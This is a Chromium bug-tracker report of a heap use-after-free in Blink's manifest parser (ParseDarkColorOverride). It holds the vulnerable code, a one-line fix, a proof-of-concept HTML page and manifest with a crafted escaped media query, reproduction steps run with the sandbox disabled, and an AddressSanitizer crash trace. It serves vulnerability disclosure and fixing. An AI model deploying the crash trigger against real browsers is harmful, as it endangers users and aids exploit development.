# UAF in ParseDarkColorOverride

| Field | Value |
|-------|-------|
| **Issue ID** | [339788215](https://issues.chromium.org/issues/339788215) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>AppManifest |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | ha...@gmail.com |
| **Assignee** | lo...@google.com |
| **Created** | 2024-05-10 |
| **Bounty** | $7,000.00 |

## Description

This vulnerability is similar to https://chromium-review.googlesource.com/c/chromium/src/+/5528856


fix
CSSTokenizer tokenizer(media_query.value());

auto tokens = tokenizer.TokenizeToEOF();

## Timeline

### ha...@gmail.com (2024-05-10)

The PoC may be as follows, but an error is reported on my machine, so it is still being constructed to reproduce.

manifest.json

```
{
    "manifest_version": 3,
    "short_name": "Weather",
    "name": "test",
    "version": "2.0",
    "permissions": ["activeTab"],


     "theme_colors": {
          "media": "\\qqqqqqqqqqqqqqqqqqq",
          "colors": [51, 51, 51]
        },
      
    
     "user_preferences": {
            "color_scheme": {
              "dark": {
                "theme_color": "#000",
                "background_color": "#000"
              },
              "light": {
                "theme_color": "#fff",
                "background_color": "#fff"
              }
            }
     },
    "description": "Weather forecast information"
  }

```

### ha...@gmail.com (2024-05-10)

<https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/modules/manifest/manifest_parser.cc;l=2325;drc=2313c7b1eac8a865df914f036ae10de3b4607dfa;bpv=1;bpt=1>

auto tokens = CSSTokenizer(media\_query.value()).TokenizeToEOF();
CSSParserTokenRange range(tokens);
while (!range.AtEnd()) {
if (range.Peek().GetType() == kIdentToken &&
(range.Peek().Value().ToString().LowerASCII() !=
"prefers-color-scheme" &&
range.Peek().Id() != CSSValueID::kDark)) {
// Skip the query if it contains anything other than
// "(prefers-color-scheme: dark)".
break;
}
range.Consume();
if (range.AtEnd() && media\_query\_evaluator.Eval(\*MediaQuerySet::Create(
media\_query.value(), execution\_context\_))) {
return color.value();
}
}

### ad...@google.com (2024-05-10)

I agree that this is a UaF (I wouldn't have spotted it without seeing the previous bug!)

It's surprising that you can't find a PoC that triggers it, but I think it's clear enough for me to pass through to the relevant engineering team anyway. This seems to be renderer code and has the precondition that the user must have installed a crafted extension, so it's S2. This code hasn't changed since 2022 so I think it's safe to set FoundIn for the current extended stable.

### ha...@gmail.com (2024-05-11)

reproduce step

1.chrome <http://127.0.0.1:9000/PoC.html> --no-sandbox

### ha...@gmail.com (2024-05-11)

PoC.html

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Hello World PWA</title>
  <link rel="manifest" href="/manifest.json">
</head>
<body>
  <h1>Hello World!</h1>
  <p>Welcome to my PWA.</p>
</body>
</html>

```

manifest.json

```
{
    "name": "HackerWeb",
    "short_name": "HackerWeb",
    "start_url": ".",
    "display": "standalone",
    "description": "A readable Hacker News app.",
    "theme_color": "red",
    "theme_colors": [
        { "color": "red" },
        { "color": "darkred", "media": "\\qqqqqqqqq" }
    ]
    
  }

```
```
=================================================================
==31653==ERROR: AddressSanitizer: heap-use-after-free on address 0x6030002ae1dc at pc 0x000105582140 bp 0x00016b799370 sp 0x00016b798b20
READ of size 9 at 0x6030002ae1dc thread T0
==31653==WARNING: invalid path to external symbolizer!
==31653==WARNING: Failed to use and restart external symbolizer!
    #0 0x10558213c in __asan_memcpy+0x3d4 (/Users/test/chromium/src/out/Default/libclang_rt.asan_osx_dynamic.dylib:arm64+0x4e13c)
    #1 0x132d30504 in WTF::StringImpl::Create(unsigned char const*, unsigned int)+0x178 (/Users/test/chromium/src/out/Default/libblink_platform_wtf.dylib:arm64+0x48504)
    #2 0x132d79a7c in WTF::String::String(unsigned char const*, unsigned int)+0x28 (/Users/test/chromium/src/out/Default/libblink_platform_wtf.dylib:arm64+0x91a7c)
    #3 0x132d5178c in WTF::StringView::ToString() const+0x2b8 (/Users/test/chromium/src/out/Default/libblink_platform_wtf.dylib:arm64+0x6978c)
    #4 0x17493b004 in blink::ManifestParser::ParseDarkColorOverride(blink::JSONObject const*, WTF::String const&)+0xa24 (/Users/test/chromium/src/out/Default/libblink_modules.dylib:arm64+0x1c4f004)
    #5 0x174924828 in blink::ManifestParser::Parse()+0x1f00 (/Users/test/chromium/src/out/Default/libblink_modules.dylib:arm64+0x1c38828)
    #6 0x174904bdc in blink::ManifestManager::ParseManifestFromPage(blink::KURL const&, std::__Cr::optional<blink::KURL>, WTF::String const&)+0x280 (/Users/test/chromium/src/out/Default/libblink_modules.dylib:arm64+0x1c18bdc)
    #7 0x1749068bc in blink::ManifestManager::OnManifestFetchComplete(blink::KURL const&, blink::ResourceResponse const&, WTF::String const&)+0x174 (/Users/test/chromium/src/out/Default/libblink_modules.dylib:arm64+0x1c1a8bc)
    #8 0x17491e9d0 in base::internal::Invoker<base::internal::FunctorTraits<void (blink::ManifestManager::*&&)(blink::KURL const&, blink::ResourceResponse const&, WTF::String const&), cppgc::internal::BasicPersistent<blink::ManifestManager, cppgc::internal::WeakPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>&&, blink::KURL&&>, base::internal::BindState<true, true, false, void (blink::ManifestManager::*)(blink::KURL const&, blink::ResourceResponse const&, WTF::String const&), cppgc::internal::BasicPersistent<blink::ManifestManager, cppgc::internal::WeakPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>, blink::KURL>, void (blink::ResourceResponse const&, WTF::String const&)>::RunOnce(base::internal::BindStateBase*, blink::ResourceResponse const&, WTF::String const&)+0x134 (/Users/test/chromium/src/out/Default/libblink_modules.dylib:arm64+0x1c329d0)
    #9 0x1749005c8 in blink::ManifestFetcher::DidFinishLoading(unsigned long long)+0x188 (/Users/test/chromium/src/out/Default/libblink_modules.dylib:arm64+0x1c145c8)
    #10 0x15b910f64 in blink::ThreadableLoader::NotifyFinished(blink::Resource*)+0x278 (/Users/test/chromium/src/out/Default/libblink_core.dylib:arm64+0x2674f64)
    #11 0x15039d788 in blink::Resource::NotifyFinished()+0x170 (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x925788)
    #12 0x1503d91dc in blink::ResourceFetcher::HandleLoaderFinish(blink::Resource*, base::TimeTicks, blink::ResourceFetcher::LoaderFinishType, unsigned int)+0x600 (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x9611dc)
    #13 0x150415234 in blink::ResourceLoader::DidFinishLoading(base::TimeTicks, long long, unsigned long long, long long)+0x53c (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x99d234)
    #14 0x150455cec in blink::ResponseBodyLoader::OnStateChange()+0xe4c (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x9ddcec)
    #15 0x150370d70 in blink::DataPipeBytesConsumer::Notify(unsigned int)+0x284 (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x8f8d70)
    #16 0x150373e80 in base::internal::Invoker<base::internal::FunctorTraits<void (blink::DataPipeBytesConsumer::* const&)(unsigned int), cppgc::internal::BasicPersistent<blink::DataPipeBytesConsumer, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy> const&>, base::internal::BindState<true, true, false, void (blink::DataPipeBytesConsumer::*)(unsigned int), cppgc::internal::BasicPersistent<blink::DataPipeBytesConsumer, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>>, void (unsigned int)>::Run(base::internal::BindStateBase*, unsigned int)+0x124 (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x8fbe80)
    #17 0x1501ced04 in base::RepeatingCallback<void (unsigned int)>::Run(unsigned int) const &+0x154 (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x756d04)
    #18 0x150373c84 in base::internal::Invoker<base::internal::FunctorTraits<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&>, base::internal::BindState<false, true, false, void (*)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)>>, void (unsigned int, mojo::HandleSignalsState const&)>::Run(base::internal::BindStateBase*, unsigned int, mojo::HandleSignalsState const&)+0xf0 (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x8fbc84)
    #19 0x104eff9e8 in base::RepeatingCallback<void (unsigned int, mojo::HandleSignalsState const&)>::Run(unsigned int, mojo::HandleSignalsState const&) const &+0x164 (/Users/test/chromium/src/out/Default/libmojo_public_system_cpp.dylib:arm64+0x179e8)
    #20 0x104eff3f0 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&)+0x3a4 (/Users/test/chromium/src/out/Default/libmojo_public_system_cpp.dylib:arm64+0x173f0)
    #21 0x104f00310 in void base::internal::Invoker<base::internal::FunctorTraits<void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>&&, int&&, unsigned int&&, mojo::HandleSignalsState&&>, base::internal::BindState<true, true, false, void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>, void ()>::RunImpl<void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>, 0ul, 1ul, 2ul, 3ul>(void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>&&, std::__Cr::integer_sequence<unsigned long, 0ul, 1ul, 2ul, 3ul>)+0x198 (/Users/test/chromium/src/out/Default/libmojo_public_system_cpp.dylib:arm64+0x18310)
    #22 0x106bc5e28 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x34c (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x18de28)
    #23 0x106c2ce98 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+0x804 (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x1f4e98)
    #24 0x106c2c318 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+0x158 (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x1f4318)
    #25 0x106ab6e0c in base::MessagePumpDefault::Run(base::MessagePump::Delegate*)+0x1b0 (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x7ee0c)
    #26 0x106c2e478 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta)+0x3cc (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x1f6478)
    #27 0x106b58910 in base::RunLoop::Run(base::Location const&)+0x438 (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x120910)
    #28 0x113e127ac in content::RendererMain(content::MainFunctionParams)+0x7e0 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x2ee67ac)
    #29 0x113fc4c28 in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*)+0x23c (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x3098c28)
    #30 0x113fc6878 in content::ContentMainRunnerImpl::Run()+0x568 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x309a878)
    #31 0x113fc2bec in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*)+0x670 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x3096bec)
    #32 0x113fc34a4 in content::ContentMain(content::ContentMainParams)+0x190 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x30974a4)
    #33 0x11ab1addc in ChromeMain+0x338 (/Users/test/chromium/src/out/Default/libchrome_dll.dylib:arm64+0xaddc)
    #34 0x104664ce4 in main+0x254 (/Users/test/chromium/src/out/Default/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/126.0.6451.0/Helpers/Chromium Helper (Renderer).app/Contents/MacOS/Chromium Helper (Renderer):arm64+0x100000ce4)
    #35 0x182c250dc  (<unknown module>)
    #36 0x41fffffffffffffc  (<unknown module>)

0x6030002ae1dc is located 12 bytes inside of 21-byte region [0x6030002ae1d0,0x6030002ae1e5)
freed by thread T0 here:
    #0 0x105585100 in __asan_memmove+0x2c64 (/Users/test/chromium/src/out/Default/libclang_rt.asan_osx_dynamic.dylib:arm64+0x51100)
    #1 0x172d2bf94 in WTF::VectorTypeOperations<WTF::String, WTF::PartitionAllocator>::Destruct(WTF::String*, WTF::String*)+0x30 (/Users/test/chromium/src/out/Default/libblink_modules.dylib:arm64+0x3ff94)
    #2 0x17493b460 in blink::ManifestParser::ParseDarkColorOverride(blink::JSONObject const*, WTF::String const&)+0xe80 (/Users/test/chromium/src/out/Default/libblink_modules.dylib:arm64+0x1c4f460)
    #3 0x174924828 in blink::ManifestParser::Parse()+0x1f00 (/Users/test/chromium/src/out/Default/libblink_modules.dylib:arm64+0x1c38828)
    #4 0x174904bdc in blink::ManifestManager::ParseManifestFromPage(blink::KURL const&, std::__Cr::optional<blink::KURL>, WTF::String const&)+0x280 (/Users/test/chromium/src/out/Default/libblink_modules.dylib:arm64+0x1c18bdc)
    #5 0x1749068bc in blink::ManifestManager::OnManifestFetchComplete(blink::KURL const&, blink::ResourceResponse const&, WTF::String const&)+0x174 (/Users/test/chromium/src/out/Default/libblink_modules.dylib:arm64+0x1c1a8bc)
    #6 0x17491e9d0 in base::internal::Invoker<base::internal::FunctorTraits<void (blink::ManifestManager::*&&)(blink::KURL const&, blink::ResourceResponse const&, WTF::String const&), cppgc::internal::BasicPersistent<blink::ManifestManager, cppgc::internal::WeakPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>&&, blink::KURL&&>, base::internal::BindState<true, true, false, void (blink::ManifestManager::*)(blink::KURL const&, blink::ResourceResponse const&, WTF::String const&), cppgc::internal::BasicPersistent<blink::ManifestManager, cppgc::internal::WeakPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>, blink::KURL>, void (blink::ResourceResponse const&, WTF::String const&)>::RunOnce(base::internal::BindStateBase*, blink::ResourceResponse const&, WTF::String const&)+0x134 (/Users/test/chromium/src/out/Default/libblink_modules.dylib:arm64+0x1c329d0)
    #7 0x1749005c8 in blink::ManifestFetcher::DidFinishLoading(unsigned long long)+0x188 (/Users/test/chromium/src/out/Default/libblink_modules.dylib:arm64+0x1c145c8)
    #8 0x15b910f64 in blink::ThreadableLoader::NotifyFinished(blink::Resource*)+0x278 (/Users/test/chromium/src/out/Default/libblink_core.dylib:arm64+0x2674f64)
    #9 0x15039d788 in blink::Resource::NotifyFinished()+0x170 (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x925788)
    #10 0x1503d91dc in blink::ResourceFetcher::HandleLoaderFinish(blink::Resource*, base::TimeTicks, blink::ResourceFetcher::LoaderFinishType, unsigned int)+0x600 (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x9611dc)
    #11 0x150415234 in blink::ResourceLoader::DidFinishLoading(base::TimeTicks, long long, unsigned long long, long long)+0x53c (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x99d234)
    #12 0x150455cec in blink::ResponseBodyLoader::OnStateChange()+0xe4c (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x9ddcec)
    #13 0x150370d70 in blink::DataPipeBytesConsumer::Notify(unsigned int)+0x284 (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x8f8d70)
    #14 0x150373e80 in base::internal::Invoker<base::internal::FunctorTraits<void (blink::DataPipeBytesConsumer::* const&)(unsigned int), cppgc::internal::BasicPersistent<blink::DataPipeBytesConsumer, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy> const&>, base::internal::BindState<true, true, false, void (blink::DataPipeBytesConsumer::*)(unsigned int), cppgc::internal::BasicPersistent<blink::DataPipeBytesConsumer, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>>, void (unsigned int)>::Run(base::internal::BindStateBase*, unsigned int)+0x124 (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x8fbe80)
    #15 0x1501ced04 in base::RepeatingCallback<void (unsigned int)>::Run(unsigned int) const &+0x154 (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x756d04)
    #16 0x150373c84 in base::internal::Invoker<base::internal::FunctorTraits<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&>, base::internal::BindState<false, true, false, void (*)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)>>, void (unsigned int, mojo::HandleSignalsState const&)>::Run(base::internal::BindStateBase*, unsigned int, mojo::HandleSignalsState const&)+0xf0 (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x8fbc84)
    #17 0x104eff9e8 in base::RepeatingCallback<void (unsigned int, mojo::HandleSignalsState const&)>::Run(unsigned int, mojo::HandleSignalsState const&) const &+0x164 (/Users/test/chromium/src/out/Default/libmojo_public_system_cpp.dylib:arm64+0x179e8)
    #18 0x104eff3f0 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&)+0x3a4 (/Users/test/chromium/src/out/Default/libmojo_public_system_cpp.dylib:arm64+0x173f0)
    #19 0x104f00310 in void base::internal::Invoker<base::internal::FunctorTraits<void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>&&, int&&, unsigned int&&, mojo::HandleSignalsState&&>, base::internal::BindState<true, true, false, void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>, void ()>::RunImpl<void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>, 0ul, 1ul, 2ul, 3ul>(void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>&&, std::__Cr::integer_sequence<unsigned long, 0ul, 1ul, 2ul, 3ul>)+0x198 (/Users/test/chromium/src/out/Default/libmojo_public_system_cpp.dylib:arm64+0x18310)
    #20 0x106bc5e28 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x34c (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x18de28)
    #21 0x106c2ce98 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+0x804 (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x1f4e98)
    #22 0x106c2c318 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+0x158 (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x1f4318)
    #23 0x106ab6e0c in base::MessagePumpDefault::Run(base::MessagePump::Delegate*)+0x1b0 (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x7ee0c)
    #24 0x106c2e478 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta)+0x3cc (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x1f6478)
    #25 0x106b58910 in base::RunLoop::Run(base::Location const&)+0x438 (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x120910)
    #26 0x113e127ac in content::RendererMain(content::MainFunctionParams)+0x7e0 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x2ee67ac)
    #27 0x113fc4c28 in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*)+0x23c (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x3098c28)
    #28 0x113fc6878 in content::ContentMainRunnerImpl::Run()+0x568 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x309a878)
    #29 0x113fc2bec in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*)+0x670 (/Users/test/chromium/src/out/Default/libcontent.dylib:arm64+0x3096bec)

previously allocated by thread T0 here:
    #0 0x105585014 in __asan_memmove+0x2b78 (/Users/test/chromium/src/out/Default/libclang_rt.asan_osx_dynamic.dylib:arm64+0x51014)
    #1 0x104e58838 in void* partition_alloc::PartitionRoot::Alloc<(partition_alloc::internal::AllocFlags)0>(unsigned long, char const*)+0x100 (/Users/test/chromium/src/out/Default/libbase_allocator_partition_allocator_src_partition_alloc_allocator_core.dylib:arm64+0x1c838)
    #2 0x132d3046c in WTF::StringImpl::Create(unsigned char const*, unsigned int)+0xe0 (/Users/test/chromium/src/out/Default/libblink_platform_wtf.dylib:arm64+0x4846c)
    #3 0x132d79a7c in WTF::String::String(unsigned char const*, unsigned int)+0x28 (/Users/test/chromium/src/out/Default/libblink_platform_wtf.dylib:arm64+0x91a7c)
    #4 0x132d23114 in void WTF::StringBuilder::BuildString<WTF::String>()+0x200 (/Users/test/chromium/src/out/Default/libblink_platform_wtf.dylib:arm64+0x3b114)
    #5 0x132d22d98 in WTF::StringBuilder::ReleaseString()+0xf0 (/Users/test/chromium/src/out/Default/libblink_platform_wtf.dylib:arm64+0x3ad98)
    #6 0x159893f40 in blink::ConsumeName(blink::CSSTokenizerInputStream&)+0x4f8 (/Users/test/chromium/src/out/Default/libblink_core.dylib:arm64+0x5f7f40)
    #7 0x15991340c in blink::CSSTokenizer::ConsumeName()+0x384 (/Users/test/chromium/src/out/Default/libblink_core.dylib:arm64+0x67740c)
    #8 0x159911c90 in blink::CSSTokenizer::ConsumeIdentLikeToken()+0x124 (/Users/test/chromium/src/out/Default/libblink_core.dylib:arm64+0x675c90)
    #9 0x1599152e4 in blink::CSSTokenizer::ReverseSolidus(char16_t)+0x2a4 (/Users/test/chromium/src/out/Default/libblink_core.dylib:arm64+0x6792e4)
    #10 0x15990a878 in blink::CSSTokenizer::TokenizeToEOF()+0x8b0 (/Users/test/chromium/src/out/Default/libblink_core.dylib:arm64+0x66e878)
    #11 0x17493ad74 in blink::ManifestParser::ParseDarkColorOverride(blink::JSONObject const*, WTF::String const&)+0x794 (/Users/test/chromium/src/out/Default/libblink_modules.dylib:arm64+0x1c4ed74)
    #12 0x174924828 in blink::ManifestParser::Parse()+0x1f00 (/Users/test/chromium/src/out/Default/libblink_modules.dylib:arm64+0x1c38828)
    #13 0x174904bdc in blink::ManifestManager::ParseManifestFromPage(blink::KURL const&, std::__Cr::optional<blink::KURL>, WTF::String const&)+0x280 (/Users/test/chromium/src/out/Default/libblink_modules.dylib:arm64+0x1c18bdc)
    #14 0x1749068bc in blink::ManifestManager::OnManifestFetchComplete(blink::KURL const&, blink::ResourceResponse const&, WTF::String const&)+0x174 (/Users/test/chromium/src/out/Default/libblink_modules.dylib:arm64+0x1c1a8bc)
    #15 0x17491e9d0 in base::internal::Invoker<base::internal::FunctorTraits<void (blink::ManifestManager::*&&)(blink::KURL const&, blink::ResourceResponse const&, WTF::String const&), cppgc::internal::BasicPersistent<blink::ManifestManager, cppgc::internal::WeakPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>&&, blink::KURL&&>, base::internal::BindState<true, true, false, void (blink::ManifestManager::*)(blink::KURL const&, blink::ResourceResponse const&, WTF::String const&), cppgc::internal::BasicPersistent<blink::ManifestManager, cppgc::internal::WeakPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>, blink::KURL>, void (blink::ResourceResponse const&, WTF::String const&)>::RunOnce(base::internal::BindStateBase*, blink::ResourceResponse const&, WTF::String const&)+0x134 (/Users/test/chromium/src/out/Default/libblink_modules.dylib:arm64+0x1c329d0)
    #16 0x1749005c8 in blink::ManifestFetcher::DidFinishLoading(unsigned long long)+0x188 (/Users/test/chromium/src/out/Default/libblink_modules.dylib:arm64+0x1c145c8)
    #17 0x15b910f64 in blink::ThreadableLoader::NotifyFinished(blink::Resource*)+0x278 (/Users/test/chromium/src/out/Default/libblink_core.dylib:arm64+0x2674f64)
    #18 0x15039d788 in blink::Resource::NotifyFinished()+0x170 (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x925788)
    #19 0x1503d91dc in blink::ResourceFetcher::HandleLoaderFinish(blink::Resource*, base::TimeTicks, blink::ResourceFetcher::LoaderFinishType, unsigned int)+0x600 (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x9611dc)
    #20 0x150415234 in blink::ResourceLoader::DidFinishLoading(base::TimeTicks, long long, unsigned long long, long long)+0x53c (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x99d234)
    #21 0x150455cec in blink::ResponseBodyLoader::OnStateChange()+0xe4c (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x9ddcec)
    #22 0x150370d70 in blink::DataPipeBytesConsumer::Notify(unsigned int)+0x284 (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x8f8d70)
    #23 0x150373e80 in base::internal::Invoker<base::internal::FunctorTraits<void (blink::DataPipeBytesConsumer::* const&)(unsigned int), cppgc::internal::BasicPersistent<blink::DataPipeBytesConsumer, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy> const&>, base::internal::BindState<true, true, false, void (blink::DataPipeBytesConsumer::*)(unsigned int), cppgc::internal::BasicPersistent<blink::DataPipeBytesConsumer, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>>, void (unsigned int)>::Run(base::internal::BindStateBase*, unsigned int)+0x124 (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x8fbe80)
    #24 0x1501ced04 in base::RepeatingCallback<void (unsigned int)>::Run(unsigned int) const &+0x154 (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x756d04)
    #25 0x150373c84 in base::internal::Invoker<base::internal::FunctorTraits<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&>, base::internal::BindState<false, true, false, void (*)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)>>, void (unsigned int, mojo::HandleSignalsState const&)>::Run(base::internal::BindStateBase*, unsigned int, mojo::HandleSignalsState const&)+0xf0 (/Users/test/chromium/src/out/Default/libblink_platform.dylib:arm64+0x8fbc84)
    #26 0x104eff9e8 in base::RepeatingCallback<void (unsigned int, mojo::HandleSignalsState const&)>::Run(unsigned int, mojo::HandleSignalsState const&) const &+0x164 (/Users/test/chromium/src/out/Default/libmojo_public_system_cpp.dylib:arm64+0x179e8)
    #27 0x104eff3f0 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&)+0x3a4 (/Users/test/chromium/src/out/Default/libmojo_public_system_cpp.dylib:arm64+0x173f0)
    #28 0x104f00310 in void base::internal::Invoker<base::internal::FunctorTraits<void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>&&, int&&, unsigned int&&, mojo::HandleSignalsState&&>, base::internal::BindState<true, true, false, void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>, void ()>::RunImpl<void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>, 0ul, 1ul, 2ul, 3ul>(void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), std::__Cr::tuple<base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>&&, std::__Cr::integer_sequence<unsigned long, 0ul, 1ul, 2ul, 3ul>)+0x198 (/Users/test/chromium/src/out/Default/libmojo_public_system_cpp.dylib:arm64+0x18310)
    #29 0x106bc5e28 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x34c (/Users/test/chromium/src/out/Default/libbase.dylib:arm64+0x18de28)

SUMMARY: AddressSanitizer: heap-use-after-free (/Users/test/chromium/src/out/Default/libblink_platform_wtf.dylib:arm64+0x48504) in WTF::StringImpl::Create(unsigned char const*, unsigned int)+0x178
Shadow bytes around the buggy address:
  0x6030002adf00: fd fd fd fd f7 fa fd fd fd fa f7 fa fd fd fd fd
  0x6030002adf80: f7 fa fd fd fd fd f7 fa fd fd fd fa f7 fa fd fd
  0x6030002ae000: fd fd f7 fa fd fd fd fd f7 fa fd fd fd fa f7 fa
  0x6030002ae080: fd fd fd fa f7 fa fd fd fd fd f7 fa 00 00 00 fa
